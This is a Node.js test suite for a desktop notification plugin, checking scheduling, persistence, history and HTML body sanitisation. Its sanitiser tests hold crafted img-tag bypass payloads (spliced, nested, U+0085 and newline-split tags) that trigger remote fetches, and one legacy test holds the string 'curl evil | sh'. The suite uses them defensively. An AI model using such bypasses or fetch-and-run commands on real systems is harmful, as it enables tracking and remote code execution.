#!/bin/bash

set -euo pipefail

source "$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)/base-test.sh"

run_node_test <<'JS'
const fs = require('fs')
const notifications = requireFromRoot('shell/plugins/notifications/NotificationLogic.js')

const schedule = notifications.createPopupSchedule()
const outputA = {}, outputB = {}, replacementOwner = {}
schedule.reset('first', 8000, 100)
schedule.reset('critical', 0, 100)
schedule.reset('second', 5000, 100)
assertEqual(schedule.next(1100), 4000, 'popup scheduler selects the earliest deadline')
schedule.hover('first', outputA, true, 2100)
schedule.hover('first', outputA, true, 2200)
schedule.hover('first', outputB, true, 2300)
schedule.remove('second')
assertEqual(schedule.next(9000), null, 'hovering either output pauses the shared toast and critical alerts have no timer')
schedule.hover('first', outputA, false, 9000)
assertEqual(schedule.next(10000), null, 'leaving one output keeps another output hover active')
schedule.hover('first', outputB, false, 10000)
assertEqual(schedule.next(10000), 6000, 'destroying the final hovered card resumes the unspent lifetime')
assertDeepEqual(schedule.due(15999), [], 'toast never expires before its resumed deadline')
assertDeepEqual(schedule.due(16000), ['first'], 'toast expires at its monotonic deadline')
schedule.reset('first', 8000, 16000)
assertDeepEqual(schedule.due(16000), [], 'content replacement invalidates a stale timeout')
schedule.hover('first', outputA, true, 17000)
schedule.reset('first', 5000, 18000)
assertEqual(schedule.next(19000), null, 'content replacement preserves current hover owners')
schedule.hover('first', outputA, false, 19000)
assertEqual(schedule.next(19000), 5000, 'updated content receives a full lifetime after hover')
schedule.remove('first')
schedule.reset('first', 5000, 20000)
schedule.hover('first', replacementOwner, true, 20000)
schedule.hover('first', outputA, false, 21000)
assertEqual(schedule.next(21000), null, 'destroyed copies of a replaced toast cannot release its new hover owner')
schedule.hover('first', replacementOwner, false, 22000)
schedule.hover('first', replacementOwner, true, 28000)
schedule.hover('first', replacementOwner, false, 29000)
assertDeepEqual(schedule.due(29000), ['first'], 'hover arriving after a deadline cannot make an expired toast permanent')
schedule.remove('first')
assertEqual(schedule.next(30000), null, 'removing the last expiring toast stops all expiry work')
assertEqual(notifications.createPopupSchedule().next(0), null, 'a reloaded service starts with no stale deadline or hover owner')

assert(notifications.isChromiumDerived('Brave Browser', ''), 'notifications detect chromium-derived apps by name')
assert(notifications.isChromiumDerived('', 'microsoft-edge'), 'notifications detect chromium-derived apps by icon')
assert(!notifications.isChromiumDerived('Slack', ''), 'notifications do not treat unrelated apps as chromium-derived')

assertEqual(
  notifications.sanitizeBody('<img src="x">Hello', 'Slack', ''),
  'Hello',
  'notifications strip inline image tags'
)

// The body renders as StyledText, which fetches <img src> over the network. The
// invariant that matters is not a particular output string but that no tag Qt
// would honour as an image survives, so assert that directly. Tags are bounded
// the conservative way the stripper bounds them: a `<` opens a tag that runs to
// the next `>`. Qt's own bound can be longer, since a `>` inside a quoted
// attribute value does not close a tag there — which only ever splits one Qt
// tag into several here, so a name this helper reads is a name Qt reads too.
function survivingTagNames(text) {
  const names = []
  let i = 0
  while (i < text.length) {
    const open = text.indexOf('<', i)
    if (open === -1) break
    const close = text.indexOf('>', open)
    const tag = close === -1 ? text.slice(open) : text.slice(open, close + 1)
    // Read the name the way Qt does, skipping anything that is not part of it.
    // Matching the separator with \s instead would give this helper the same
    // blind spot as the code it is checking — Qt skips U+0085 and \s does not —
    // and an assertion that shares the implementation's bug proves nothing.
    const name = /^<[^A-Za-z0-9]*([A-Za-z0-9]+)/.exec(tag)
    if (name) names.push(name[1].toLowerCase())
    i = close === -1 ? text.length : close + 1
  }
  return names
}

// Assert on styledBody, not sanitizeBody: styledBody is the string the card
// binds to the StyledText, so it is the only one Qt ever parses. Checking the
// sanitizer's output instead would pass a body whose surviving tag the newline
// rewrite later splits open.
function assertNoImageSurvives(body, description) {
  const out = notifications.styledBody(body, 'Slack', '')
  const names = survivingTagNames(out)
  assert(
    !names.includes('img'),
    description,
    `input:  ${body}\noutput: ${out}\ntags:   ${JSON.stringify(names)}`
  )
}

assertNoImageSurvives(
  '<img src="http://host/plain.png">',
  'notifications leave no image tag for a plain payload'
)

// A payload spliced inside the literal "<img" prefix. Qt reads ONE malformed
// tag named `im` here and renders nothing; a stripper that deleted the inner
// match would close the halves up into a live <img> the input never had.
assertNoImageSurvives(
  '<im<img src="http://host/decoy.png">g src="http://host/beacon.png">',
  'notifications leave no image tag when a payload is spliced inside <img'
)

assertNoImageSurvives(
  '<im<im<img src=a>g src=b>g src="http://host/deep.png">',
  'notifications leave no image tag for a doubly nested payload'
)

assertNoImageSurvives(
  '<img<img src="http://host/twin.png">',
  'notifications leave no image tag when the outer tag is itself named img'
)

assertNoImageSurvives(
  '< img src="http://host/spaced.png">',
  'notifications leave no image tag when whitespace follows the angle bracket'
)

// Qt skips the separator between `<` and the tag name with QChar::isSpace(),
// which counts U+0085 NEL. JavaScript's \s does not. Reading the name with \s
// finds none here, keeps the tag, and Qt then reads `img` and fetches it —
// measured against Qt 6.11.2, where this exact body makes a StyledText Text
// issue an outbound GET. Asserted on the whole output rather than through
// assertNoImageSurvives so it holds even if that helper is ever loosened.
assertEqual(
  notifications.sanitizeBody('<\u0085img src="http://host/nel.png">after', 'Slack', ''),
  'after',
  'notifications strip an image tag whose separator is U+0085, which Qt skips but \\s does not'
)

assertNoImageSurvives(
  '<\u0085img src="http://host/nel2.png">',
  'notifications leave no image tag when U+0085 follows the angle bracket'
)

// The card rewrites newlines to <br/> for the StyledText, which puts tag syntax
// inside a tag the stripper kept: `<x`, newline, `<img …>` is one tag named `x`
// to both the stripper and Qt, and the rewrite splits it into `<x<br/>` and a
// live image tag. Measured against Qt 6.11.2 — the rewritten form issues the GET
// and the original does not — so the strip has to run after the rewrite, which
// is what styledBody() does.
assertNoImageSurvives(
  '<x\n<img src="http://host/split.png">',
  'notifications leave no image tag when a newline rewrite splits a kept tag'
)

assertNoImageSurvives(
  '<x\r\n<img src="http://host/split-crlf.png">',
  'notifications leave no image tag when a CRLF rewrite splits a kept tag'
)

assertEqual(
  notifications.styledBody('<x\n<img src="http://host/split.png">', 'Slack', ''),
  '<x<br/>',
  'notifications drop the image half of a tag the newline rewrite splits'
)

// The rewrite itself still happens, and body markup other than images survives it.
assertEqual(
  notifications.styledBody('<b>bold</b>\nsecond line', 'Slack', ''),
  '<b>bold</b><br/>second line',
  'notifications keep body markup and the line break the card renders'
)

// The order above is only worth anything if the card actually renders it, and no
// JavaScript assertion can see a QML binding. Pin the binding itself: the rewrite
// belongs in the logic module, where the strip runs after it.
const cardQml = fs.readFileSync(path.join(root, 'shell/plugins/notifications/components/NotificationCard.qml'), 'utf8')
assert(
  /readonly property string styledBody: NotificationLogic\.styledBody\(body, app, appIcon\)/.test(cardQml),
  'the notification card renders the body that was stripped after the newline rewrite'
)
assert(
  !/<br\/>/.test(cardQml),
  'the notification card does not rewrite newlines itself, which would leave tag syntax unchecked'
)

assertEqual(
  notifications.sanitizeBody('trailing <img src="http://host/z.png"', 'Slack', ''),
  'trailing ',
  'notifications strip an unterminated image tag the renderer would close itself'
)

assertEqual(
  notifications.sanitizeBody('<IMG SRC="http://host/u.png">shout', 'Slack', ''),
  'shout',
  'notifications strip image tags regardless of case'
)

assertEqual(
  notifications.sanitizeBody('<b>bold</b> and <a href="http://host">link</a>', 'Slack', ''),
  '<b>bold</b> and <a href="http://host">link</a>',
  'notifications keep the body markup the body-markup capability advertises'
)

assertEqual(
  notifications.sanitizeBody('<a href="https://example.com">example.com</a> Message body', 'Chromium', ''),
  'Message body',
  'notifications strip chromium leading origin links'
)

assertEqual(
  notifications.sanitizeBody('https://example.com/path Message body', 'Chromium', ''),
  'Message body',
  'notifications strip chromium leading origin text'
)

assertEqual(
  notifications.sanitizeBody('https://example.com/path Message body', 'Slack', ''),
  'https://example.com/path Message body',
  'notifications keep non-browser leading origin text'
)

assert(notifications.summaryStartsWithGlyph('󰂚  Silenced'), 'notifications detect glyph-prefixed summaries')
assert(!notifications.summaryStartsWithGlyph('Normal summary'), 'notifications ignore normal summaries as glyph-prefixed')
assert(notifications.shouldRenderCompactGlyph('K', '', true), 'notifications render glyph-only single-line toasts compactly')
assert(!notifications.shouldRenderCompactGlyph('K', '', false), 'notifications give glyph hints with bodies the large icon slot')
assert(!notifications.shouldRenderCompactGlyph('K', 'file:///tmp/image.png', true), 'notifications keep image-backed glyph hints in the icon slot')

assert(notifications.shouldBypassDnd({ appName: 'omarchy-action', urgency: 1 }, 2), 'omarchy action toasts bypass DND')
assert(notifications.shouldBypassDnd({ appName: 'notify-send', urgency: 2 }, 2), 'critical notify-send bypasses DND')
assert(!notifications.shouldBypassDnd({ appName: 'notify-send', urgency: 1 }, 2), 'normal notify-send does not bypass DND')
assert(!notifications.shouldBypassDnd({ appName: 'Slack', urgency: 2 }, 2), 'critical app notifications do not bypass DND')
assert(!notifications.shouldBypassDnd({ appName: 'omarchy-menu-keybindings', urgency: 1 }, 2), 'omarchy command app names do not bypass DND')
assert(!notifications.isEphemeralApp('omarchy-menu-keybindings'), 'notifications treat omarchy command app names as normal apps')

// The click action's argv form: parsed from the persisted omarchy-exec-argv
// JSON only when it is a non-empty array of strings whose program is present
// and not a leading-dash option. Everything else fails closed so a malformed or
// hostile hint can never fall through to a shell.
assertDeepEqual(
  notifications.parseExecArgv('["mpv","--","/home/me/a b.mp4"]'),
  ['mpv', '--', '/home/me/a b.mp4'],
  'notifications parse a valid exec argv vector'
)
assertEqual(notifications.parseExecArgv(''), null, 'notifications reject an empty exec argv hint')
assertEqual(notifications.parseExecArgv('not json'), null, 'notifications reject a non-JSON exec argv hint')
assertEqual(notifications.parseExecArgv('"mpv"'), null, 'notifications reject an exec argv hint that is not an array')
assertEqual(notifications.parseExecArgv('[]'), null, 'notifications reject an empty exec argv array')
assertEqual(notifications.parseExecArgv('["mpv",5]'), null, 'notifications reject a non-string element in the exec argv')
assertEqual(notifications.parseExecArgv('["--include=x","y"]'), null, 'notifications reject a leading-dash program in the exec argv')
assertEqual(notifications.parseExecArgv('["",""]'), null, 'notifications reject an empty program in the exec argv')

// The argv vector rides on the snapshot as the raw JSON string, so the model's
// value comparison stays a plain string compare and the file round-trip is
// lossless.
const execSnapshot = notifications.snapshotOf({
  id: 3,
  appName: 'omarchy-action',
  summary: 'Download complete',
  hints: { 'omarchy-exec-argv': '["mpv","--","/tmp/clip.mp4"]' }
}, 1)
assertEqual(
  execSnapshot.execArgv,
  '["mpv","--","/tmp/clip.mp4"]',
  'notifications carry the exec argv hint onto the snapshot'
)

assertDeepEqual(
  notifications.popupPlacement('top', 32, 6),
  {
    anchors: { top: true, bottom: false, left: false, right: true },
    margins: { top: 32, bottom: 6, left: 6, right: 6 }
  },
  'notifications clear a top bar while staying anchored top-right'
)
assertDeepEqual(
  notifications.popupPlacement('right', 32, 6),
  {
    anchors: { top: true, bottom: false, left: false, right: true },
    margins: { top: 6, bottom: 6, left: 6, right: 32 }
  },
  'notifications clear a right bar while staying anchored top-right'
)
assertDeepEqual(
  notifications.popupPlacement('bottom', 32, 6),
  {
    anchors: { top: true, bottom: false, left: false, right: true },
    margins: { top: 6, bottom: 6, left: 6, right: 6 }
  },
  'notifications ignore a bottom bar for popup placement'
)
assertDeepEqual(
  notifications.popupPlacement('left', 32, 6),
  {
    anchors: { top: true, bottom: false, left: false, right: true },
    margins: { top: 6, bottom: 6, left: 6, right: 6 }
  },
  'notifications ignore a left bar for popup placement'
)

const notification = {
  id: 12,
  appName: 'Mail',
  appIcon: 'mail',
  summary: 42,
  body: 'Body',
  image: 'file:///tmp/mail.png',
  hints: { 'omarchy-glyph': '!' },
  urgency: 1,
  expireTimeout: 1.5
}
const snapshot = notifications.snapshotOf(notification, 12345)
assertDeepEqual(
  {
    id: snapshot.id,
    originalId: snapshot.originalId,
    app: snapshot.app,
    appIcon: snapshot.appIcon,
    summary: snapshot.summary,
    body: snapshot.body,
    image: snapshot.image,
    glyph: snapshot.glyph,
    urgency: snapshot.urgency,
    expireTimeout: snapshot.expireTimeout,
    timestamp: snapshot.timestamp
  },
  {
    id: 12,
    originalId: 12,
    app: 'Mail',
    appIcon: 'mail',
    summary: '42',
    body: 'Body',
    image: 'file:///tmp/mail.png',
    glyph: '!',
    urgency: 1,
    expireTimeout: 1.5,
    timestamp: 12345
  },
  'notifications create stable snapshots'
)

// An in-place update keeps the popup's identity — the file name it was
// persisted under — and takes everything the card draws from the new content.
const replacement = notifications.replacementSnapshot(
  {
    id: 12,
    appName: 'Slack',
    summary: 'Thread v2',
    body: 'message 2',
    image: 'file:///tmp/new.png',
    hints: { 'omarchy-glyph': '!' },
    urgency: 2,
    expireTimeout: 4000
  },
  12,
  12345
)
assertDeepEqual(
  {
    id: replacement.id,
    originalId: replacement.originalId,
    timestamp: replacement.timestamp,
    summary: replacement.summary,
    body: replacement.body,
    image: replacement.image,
    glyph: replacement.glyph,
    urgency: replacement.urgency,
    expireTimeout: replacement.expireTimeout
  },
  {
    id: 12,
    originalId: 12,
    timestamp: 12345,
    summary: 'Thread v2',
    body: 'message 2',
    image: 'file:///tmp/new.png',
    glyph: '!',
    urgency: 2,
    expireTimeout: 4000
  },
  'notifications take updated content without moving the popup it replaces'
)
assertEqual(
  notifications.popupFileName(replacement),
  '12345-12.json',
  'notifications keep the persisted file name across an in-place update'
)
assert(
  !notifications.popupRowChanged(replacement, replacement),
  'notifications skip a refresh that matches the row it would write'
)
assert(
  notifications.popupRowChanged(replacement, Object.assign({}, replacement, { body: 'message 3' })),
  'notifications refresh a row whose content moved on'
)
assert(
  !notifications.popupRowChanged(replacement, Object.assign({}, replacement, { timestamp: 999 })),
  'notifications ignore identity fields when deciding whether a refresh has work'
)

const settings = notifications.parseSettings(JSON.stringify({ version: 3, dnd: true }))
assertEqual(settings.dnd, true, 'notifications parse the persisted DND state')
assertEqual(settings.legacy, false, 'notifications do not flag a current settings file as legacy')
assertEqual(notifications.parseSettings('').dnd, null, 'notifications leave DND unset without a settings file')
assertEqual(
  notifications.parseSettings(JSON.stringify({ dnd: false, pending: [], past: [] })).legacy,
  true,
  'notifications flag a settings file still carrying the retired history rows'
)
assert(notifications.parseSettings('{').error, 'notifications flag invalid settings JSON')

// History is the notification files moved into the history dir, read back
// exactly like live popup files.
const archived = [
  notifications.serializePopup({ id: 1, originalId: 1, summary: 'oldest', timestamp: 100 }, 1),
  notifications.serializePopup({ id: 2, originalId: 2, summary: 'newest', timestamp: 900, expireTimeout: 30000, deadline: 5000 }, 1),
  notifications.serializePopup({ id: 3, originalId: 3, summary: 'middle', timestamp: 500 }, 1)
].join('\n')

const historyReplay = notifications.historyRows(archived, [], 1, 2)
assertDeepEqual(
  historyReplay.map(row => row.summary),
  ['newest', 'middle'],
  'notifications replay the newest history rows up to the limit'
)
assertEqual(historyReplay[0].expireTimeout, 0, 'notifications replay history rows with the standard toast lifetime')
assertEqual('deadline' in historyReplay[0], false, 'notifications drop the restore deadline from replayed history rows')
assertDeepEqual(notifications.historyRows('', [], 1, 10), [], 'notifications replay nothing from an empty history dir')

// A toast still on screen is the newest notification there is, and its move
// into the history dir races the read, so the replay takes it from memory.
assertDeepEqual(
  notifications.historyRows(archived, [{ id: 4, originalId: 4, summary: 'on screen', timestamp: 1500 }], 1, 10)
    .map(row => row.summary),
  ['on screen', 'newest', 'middle', 'oldest'],
  'notifications replay the toasts still on screen alongside the archived ones'
)
assertDeepEqual(
  notifications.historyRows(archived, [{ id: 2, originalId: 2, summary: 'newest', timestamp: 900 }], 1, 10)
    .map(row => row.summary),
  ['newest', 'middle', 'oldest'],
  'notifications replay a toast once when its archived file already landed'
)
assertDeepEqual(
  notifications.historyRows('', [{ id: 4, originalId: 4, summary: 'on screen', timestamp: 1500 }], 1, 10)
    .map(row => row.summary),
  ['on screen'],
  'notifications replay an on-screen toast even when nothing is archived yet'
)

const popup = {
  id: 7,
  originalId: 7,
  app: 'Mail',
  appIcon: 'mail',
  summary: 'New message',
  body: 'Body',
  image: '',
  glyph: '',
  urgency: 2,
  expireTimeout: 2500,
  timestamp: 1000
}
assertEqual(notifications.popupFileName(popup), '1000-7.json', 'notifications name popup files by timestamp and id')
assertEqual(
  notifications.serializePopup(popup, 1).indexOf('\n'),
  -1,
  'notifications serialize popups to a single line'
)
assertEqual(
  notifications.popupEntry({ id: 1, timestamp: 5 }, 1).urgency,
  1,
  'notifications default popup urgency to normal'
)
assertEqual(
  notifications.popupEntry({ id: 1, timestamp: 5, expireTimeout: 4000 }, 1).expireTimeout,
  4000,
  'notifications preserve popup expire timeouts unlike history rows'
)

// Persisted entries must not reference images another process owns: Chromium
// web apps (WhatsApp avatars included) delete their scoped /tmp files when
// the notification closes, and image:// URLs die with the live object.
assertEqual(
  notifications.localImageFile('file:///tmp/scoped_dir/logo%20a.png'),
  '/tmp/scoped_dir/logo a.png',
  'notifications resolve file URLs to copyable paths'
)
assertEqual(notifications.localImageFile('/tmp/avatar.png'), '/tmp/avatar.png', 'notifications treat absolute paths as copyable')
assertEqual(notifications.localImageFile('mail'), '', 'notifications leave themed icon names uncopied')
assertEqual(notifications.localImageFile('image://notifs/1'), '', 'notifications cannot copy in-process image URLs')

const persistable = notifications.persistablePopup(
  { id: 9, originalId: 9, timestamp: 2000, appIcon: 'file:///tmp/scoped/logo.png', image: 'image://notifs/9', summary: 'Hi' },
  '/state/images/'
)
assertDeepEqual(
  persistable.copies,
  [{ from: '/tmp/scoped/logo.png', to: '/state/images/2000-9-appIcon' }],
  'notifications copy file-backed images into the state dir when persisting'
)
assertEqual(
  persistable.entry.appIcon,
  'file:///state/images/2000-9-appIcon',
  'notifications persist the image copy instead of the sender-owned original'
)
assertEqual(persistable.entry.image, '', 'notifications drop dead in-process image URLs from persisted entries')
assertEqual(persistable.entry.summary, 'Hi', 'notifications leave the rest of the persisted entry untouched')

const repersisted = notifications.persistablePopup(persistable.entry, '/state/images/')
assertDeepEqual(repersisted.copies, [], 'notifications do not re-copy an entry already pointing at its copies')
assertEqual(
  repersisted.entry.appIcon,
  'file:///state/images/2000-9-appIcon',
  'notifications keep a restored entry pointing at its existing copy'
)

assertEqual(
  notifications.persistablePopup({ id: 9, originalId: 9, timestamp: 2000, appIcon: 'mail', image: '' }, '/state/images/').copies.length,
  0,
  'notifications leave themed icons alone when persisting'
)
assertEqual(
  notifications.imageStem({ originalId: 9, timestamp: 2000 }) + '.json',
  notifications.popupFileName({ originalId: 9, timestamp: 2000 }),
  'notifications name image copies by the stem of the entry file they belong to'
)

const popupFiles = notifications.parsePopupFiles(
  [
    notifications.serializePopup({ id: 1, originalId: 1, summary: 'old-generation', urgency: 2, timestamp: 100 }, 1),
    notifications.serializePopup({ id: 1, originalId: 1, summary: 'new-generation', urgency: 1, timestamp: 300 }, 1),
    notifications.serializePopup({ id: 2, originalId: 2, summary: 'critical', urgency: 2, timestamp: 200 }, 1),
    '{ torn write'
  ].join('\n'),
  1
)
assertDeepEqual(
  popupFiles.map(row => row.summary),
  ['new-generation', 'critical', 'old-generation'],
  'notifications restore every persisted popup newest-first, never deduping ids across server generations'
)
assertDeepEqual(
  notifications.parsePopupFiles('', 1),
  [],
  'notifications restore nothing from an empty popup dir'
)

assert(!notifications.popupExpired({ timestamp: 0 }, 0, 999999), 'critical popups never expire on restore')
assert(!notifications.popupExpired({ timestamp: 1000 }, 8000, 5000), 'popups within their lifetime are restored')
assert(notifications.popupExpired({ timestamp: 1000 }, 8000, 9000), 'popups past their lifetime are not restored')
assert(
  !notifications.popupExpired({ timestamp: 1000, deadline: 20000 }, 8000, 15000),
  'a restore-reset deadline outranks the original popup timestamp'
)
assert(
  notifications.popupExpired({ timestamp: 1000, deadline: 20000 }, 8000, 20000),
  'popups past their reset deadline are not restored'
)
assertEqual(
  notifications.popupEntry(JSON.parse(notifications.serializePopup({ id: 1, originalId: 1, timestamp: 5, deadline: 9000 }, 1)), 1).deadline,
  9000,
  'notifications round-trip reset deadlines through popup files'
)
assertEqual(
  'deadline' in notifications.popupEntry({ id: 1, timestamp: 5 }, 1),
  false,
  'notifications omit the deadline field until a restore sets it'
)

// The click action (an argv vector) is the only kind that survives a shell
// restart: a libnotify action leaves its sender waiting on an id from a server
// generation that no longer exists.
assertEqual(
  notifications.snapshotOf({ id: 3, hints: { 'omarchy-glyph': '!' } }, 1).execArgv,
  '',
  'notifications leave the click command empty without an exec argv hint'
)
assertEqual(
  notifications.popupEntry(
    JSON.parse(notifications.serializePopup({ id: 1, originalId: 1, timestamp: 5, execArgv: '["mpv","--","/tmp/a b.mp4"]' }, 1)),
    1
  ).execArgv,
  '["mpv","--","/tmp/a b.mp4"]',
  'notifications round-trip the click argv through popup files'
)
assertEqual(
  notifications.popupEntry({ id: 1, originalId: 1, timestamp: 5 }, 1).execArgv,
  '',
  'notifications restore an empty click command for popups without one'
)
assertEqual(
  notifications.historyEntry({ id: 1, execArgv: '["xdg-open","/tmp/received"]' }, 1).execArgv,
  '["xdg-open","/tmp/received"]',
  'notifications keep the click argv on history rows'
)

// Upgrade fail-closed: a popup persisted by a pre-upgrade shell carried its
// click action as an `exec` shell string. After the update-triggered shell
// restart the new shell only honors execArgv, so a restored legacy popup keeps
// displaying but its click is inert — deliberately, because splitting the old
// shell string back into a command is exactly the injection being removed.
const legacyRestored = notifications.parsePopupFiles(
  JSON.stringify({ id: 7, originalId: 7, timestamp: 9, summary: 'Legacy toast', exec: 'curl evil | sh' }),
  1
)[0]
assertEqual(legacyRestored.execArgv || '', '', 'a restored legacy exec shell string is not carried into execArgv')
assert(!('exec' in legacyRestored), 'a restored legacy popup drops the old exec field')
assertEqual(notifications.parseExecArgv(legacyRestored.execArgv || ''), null, 'a restored legacy popup has no runnable click action')

const serviceQml = fs.readFileSync(path.join(root, 'shell/plugins/notifications/Service.qml'), 'utf8')

{
const vm = require('vm')
const pendingCalls = []
const popupRows = []
const archived = []
const service = {
  liveRefs: {}, restoredPopups: {}, doNotDisturb: false,
  NotificationLogic: notifications,
  popupSchedule: notifications.createPopupSchedule(),
  popupModel: {
    get count() { return popupRows.length },
    get(index) { return popupRows[index] },
    insert(index, row) { popupRows.splice(index, 0, row) },
    append(row) { popupRows.push(row) },
    remove(index) { popupRows.splice(index, 1) }
  },
  Qt: { callLater(fn) { pendingCalls.push(fn) } },
  snapshotOf(n) { return { ...n.snapshot } },
  watchForUpdates() {}, refreshPopup() {}, persistPopupFile() {}, deletePopupFileFor() {},
  archivePopupFileFor(row) { archived.push(notifications.popupFileName(row)) },
  popupNow() { return 0 }, durationFor() { return 100 }, schedulePopupExpiry() {}
}
service.service = service
vm.createContext(service)
for (const name of ['handleNotification', 'withdrawPopup', 'removePopup', 'isRestoredRow', 'removePopupsByOriginalId', 'addPopup', 'resetPopupLifetime']) {
  vm.runInContext(serviceQml.match(new RegExp('^  function ' + name + '\\([^]*?^  }', 'm'))[0], service)
}
function liveNotification(id, timestamp) {
  const closed = []
  return {
    snapshot: { originalId: id, timestamp, urgency: 1, expireTimeout: 100 }, tracked: false, dismissals: 0,
    closed: { connect(fn) { closed.push(fn) } },
    close() { closed.forEach(fn => fn()) },
    dismiss() { this.dismissals++; this.close() }
  }
}
function flushPopups() { while (pendingCalls.length) pendingCalls.shift()() }
const withdrawnEarly = liveNotification(7, 100)
service.handleNotification(withdrawnEarly)
withdrawnEarly.close()
flushPopups()
assertEqual(popupRows.length, 0, 'sender close before deferred insertion cannot resurrect a popup')
assertEqual(archived.length, 1, 'sender close archives the queued popup file before insertion')
const shown = liveNotification(7, 101)
service.handleNotification(shown)
flushPopups()
assertEqual(popupRows.length, 1, 'an open notification is inserted after the deferred callback')
withdrawnEarly.close()
assertEqual(popupRows.length, 1, 'an old notification close cannot remove a new notification reusing its id')
shown.close()
assertEqual(popupRows.length, 0, 'sender close removes its visible popup')
assertEqual(shown.dismissals, 0, 'sender close does not send a redundant dismissal to its destroyed object')
const dismissed = liveNotification(8, 102)
service.handleNotification(dismissed)
flushPopups()
service.removePopup(0, 'dismiss')
assertEqual(dismissed.dismissals, 1, 'user dismissal reaches the live notification once')
assertEqual(archived.length, 3, 'a dismissal-induced closed signal does not archive the same popup twice')
}

assert(
  /readonly property int historyLimit: 10/.test(serviceQml),
  'notifications service keeps the last ten notifications in history'
)
assert(
  /function showHistory\(\): string \{\s*return service\.showRecentHistory\(\)\s*\}/.test(serviceQml),
  'notifications history IPC replays recent notifications'
)
assert(
  /readonly property string popupStateDir: stateDir \+ "notifications\/"/.test(serviceQml),
  'notifications service persists popups under the omarchy state dir'
)
assert(
  /readonly property string historyDir: popupStateDir \+ "history\/"/.test(serviceQml),
  'notifications service keeps history in a subdirectory of the popup state dir'
)
assert(
  /if \(entry\) \{[\s\S]{0,120}?archivePopupFileFor\(entry\)[\s\S]{0,200}?popupModel\.remove\(index\)/.test(serviceQml),
  'notifications service archives the popup file when a popup leaves the screen'
)
assert(
  /mv -f \\"\$4\/\$3\\" \\"\$1\/\$3\\"/.test(serviceQml),
  'notifications service archives by moving the popup file into the history dir'
)
assert(
  /head -n \\"-\$limit\\"/.test(serviceQml),
  'notifications service trims history to the newest entries in the same job'
)
assert(
  /\\"\$imgs\/\$\{stale%\.json\}\\"-\*/.test(serviceQml),
  'notifications service drops a trimmed history entry\'s image copies with it'
)
assert(
  /readonly property string imagesDir: popupStateDir \+ "images\/"/.test(serviceQml),
  'notifications service keeps image copies beside the popup and history files'
)
assert(
  /copyImagesScript \+\n\s*"printf/.test(serviceQml),
  'notifications service copies images before writing the JSON that references them'
)
assert(
  /timeout 5 head -c 5242881 -- \\"\$1\\" > \\"\$2\.tmp\\"[\s\S]{0,120}?mv -f -- \\"\$2\.tmp\\" \\"\$2\\"/.test(serviceQml),
  'notifications service bounds image copies through a validated temp file'
)
assert(
  /rm -f \\"\$1\/\$2\.json\\" \\"\$3\/\$2\\"-\*/.test(serviceQml),
  'notifications service deletes a superseded popup\'s image copies with its file'
)
assert(
  /if \(!isEphemeral\(notification\)\) \{\s*\n\s*writeSilenced\(notification, snapshot\)/.test(serviceQml),
  'notifications service records DND-silenced notifications straight into history'
)
assert(
  /function releaseSilenced\(notification, originalId\)[\s\S]{0,300}?notification\.tracked = false/.test(serviceQml),
  'notifications service holds a silenced notification until its history write has run'
)
assert(
  /if \(updated && NotificationLogic\.popupRowChanged\(written, updated\)\) \{\s*\n\s*service\.writeSilenced\(notification, updated\)/.test(serviceQml),
  'notifications service re-persists a silenced notification updated while its write was queued'
)
assert(
  /rows\.push\(NotificationLogic\.persistablePopup\(\{[\s\S]{0,400}?\}, imagesDir\)\.entry\)/.test(serviceQml),
  'notifications service replays carried-over toasts from their persisted image copies'
)
assert(
  /function sweepOrphanImages\(\)[\s\S]{0,400}?\|\| rm -f \\"\$img\\"/.test(serviceQml),
  'notifications service sweeps image copies whose JSON never landed'
)
assert(
  /service\.replayCarryOver = liveRowsForReplay\(\)/.test(serviceQml),
  'notifications service carries the toasts still on screen into the replay'
)
assert(
  /watchForUpdates\(notification, snapshot\)/.test(serviceQml),
  'notifications service watches a shown notification for in-place updates'
)
assert(
  /if \(signal && typeof signal\.connect === "function"\) signal\.connect\(refresh\)/.test(serviceQml),
  'notifications service refreshes the popup from every property the card draws'
)
assert(
  /popupModel\.setProperty\(i, roles\[r\], updated\[roles\[r\]\]\)[\s\S]{0,600}?persistPopupFile\(updated\)/.test(serviceQml),
  'notifications service rewrites both the row and its file when a notification is updated in place'
)
assert(
  /if \(!NotificationLogic\.popupRowChanged\(row, updated\)\) return/.test(serviceQml),
  'notifications service leaves the row and its file alone when a refresh finds nothing changed'
)
assert(
  /service\.addPopup\(snapshot, true\)[\s\S]{0,400}?service\.refreshPopup\(notification, snapshot\.originalId, snapshot\.timestamp\)/.test(serviceQml),
  'notifications service catches up on an update that beat the deferred row insert'
)
assert(
  /function showRecentHistory\(\)[\s\S]{0,300}?enqueueHistoryRead\(\)/.test(serviceQml),
  'notifications service reads history from its place in the file queue'
)
assert(
  /if \(job\.read\) \{\s*\n\s*startHistoryRead\(\)/.test(serviceQml),
  'notifications service runs the queued read when its turn comes'
)
assert(
  /function runNextPopupFileJob\(\) \{\s*\n\s*if \(readHistoryProc\.running \|\| popupFileProc\.running\) return/.test(serviceQml),
  'notifications service holds queued file work until a history read finishes'
)
assert(
  /id: readHistoryProc[\s\S]{0,300}?onExited: service\.runNextPopupFileJob\(\)/.test(serviceQml),
  'notifications service releases the file queue even when a history read comes back empty'
)
assert(
  /resetPopupLifetime\(updated\)/.test(serviceQml),
  'notifications service restarts the countdown when a toast is updated under it'
)
assert(
  /awk 1 \\"\$1\\"\/\*\.json 2>\/dev\/null \|\| true", "--", historyDir/.test(serviceQml),
  'notifications service replays history by reading the archived files'
)
assert(
  /restorePopupsProc\.running = true/.test(serviceQml),
  'notifications service restores persisted popups on startup'
)
assert(
  /if \(isRestoredRow\(row\)\) continue/.test(serviceQml),
  'notifications service protects restored popups from new-generation id collisions'
)
assert(
  /var ref = !restored && originalId >= 0 \? liveRefs\[originalId\] : null/.test(serviceQml),
  'notifications service never resolves a restored popup to a live server object'
)
assert(
  /service\.restoredPopups\[NotificationLogic\.popupFileName\(rows\[i\]\)\] = true/.test(serviceQml),
  'notifications service treats replayed history rows as restored, never as live notifications'
)
assert(
  /popupFileName\(row\) !== keepFileName/.test(serviceQml),
  'notifications service keeps a same-millisecond replacement popup file'
)
assert(
  /awk 1 \\"\$1\\"\/\*\.json/.test(serviceQml),
  'notifications service delimits every popup file during restore'
)
assert(
  /parseExecArgv\(entry \? entry\.execArgv : ""\)[\s\S]{0,200}?Util\.execArgv\(argv\)/.test(serviceQml),
  'notifications service runs the popup click argv itself instead of a libnotify action'
)
assert(
  /function clear\(\): string \{\s*service\.clearHistory\(\)/.test(serviceQml),
  'notifications clear IPC forgets the recorded history'
)
assert(
  !/pendingModel|pastModel/.test(serviceQml),
